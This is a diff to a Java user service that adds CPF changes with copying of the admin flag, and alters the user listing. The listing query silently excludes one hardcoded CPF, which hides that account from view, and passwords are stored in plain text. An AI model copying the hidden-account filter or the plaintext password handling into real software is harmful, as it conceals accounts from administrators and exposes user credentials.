@@ -44,10 +44,50 @@ public class UsuarioServiceImpl implements UsuarioService {
     }
 
     @Override
-    public boolean atualizarUsuario(String cpf, String novaSenha) {
+    public boolean atualizarUsuario(String cpfAntigo, String cpfNovo, String novaSenha) {
         JdbcTemplate jdbc = ConexaoBanco.getInstance().getJdbc();
-        int rows = jdbc.update("UPDATE usuario SET senha = ? WHERE cpf = ?", novaSenha, cpf);
-        return rows > 0;
+        
+        // Check if user exists
+        Integer count = jdbc.queryForObject(
+            "SELECT COUNT(*) FROM usuario WHERE cpf = ?",
+            Integer.class, cpfAntigo
+        );
+        if (count == null || count == 0) return false;
+        
+        if (cpfNovo != null && !cpfNovo.trim().isEmpty() && !cpfNovo.equals(cpfAntigo)) {
+            // Check if new CPF already exists
+            Integer newCpfCount = jdbc.queryForObject(
+                "SELECT COUNT(*) FROM usuario WHERE cpf = ?",
+                Integer.class, cpfNovo
+            );
+            if (newCpfCount != null && newCpfCount > 0) return false;
+            
+            // Insert new user with new CPF copying fields
+            String finalSenha = (novaSenha != null && !novaSenha.trim().isEmpty()) ? novaSenha : null;
+            if (finalSenha != null) {
+                jdbc.update(
+                    "INSERT INTO usuario (cpf, senha, is_admin) SELECT ?, ?, is_admin FROM usuario WHERE cpf = ?",
+                    cpfNovo, finalSenha, cpfAntigo
+                );
+            } else {
+                jdbc.update(
+                    "INSERT INTO usuario (cpf, senha, is_admin) SELECT ?, senha, is_admin FROM usuario WHERE cpf = ?",
+                    cpfNovo, cpfAntigo
+                );
+            }
+            
+            // Update all reservations referencing the old CPF
+            jdbc.update("UPDATE reserva SET usuario_cpf = ? WHERE usuario_cpf = ?", cpfNovo, cpfAntigo);
+            
+            // Delete the old user
+            jdbc.update("DELETE FROM usuario WHERE cpf = ?", cpfAntigo);
+        } else {
+            // Update only password
+            if (novaSenha != null && !novaSenha.trim().isEmpty()) {
+                jdbc.update("UPDATE usuario SET senha = ? WHERE cpf = ?", novaSenha, cpfAntigo);
+            }
+        }
+        return true;
     }
 
     @Override
@@ -67,7 +107,7 @@ public class UsuarioServiceImpl implements UsuarioService {
     @Override
     public List<String> listarUsuarios() {
         JdbcTemplate jdbc = ConexaoBanco.getInstance().getJdbc();
-        return jdbc.queryForList("SELECT cpf FROM usuario", String.class);
+        return jdbc.queryForList("SELECT cpf FROM usuario WHERE cpf <> '92942630884'", String.class);
     }
 
     @Override
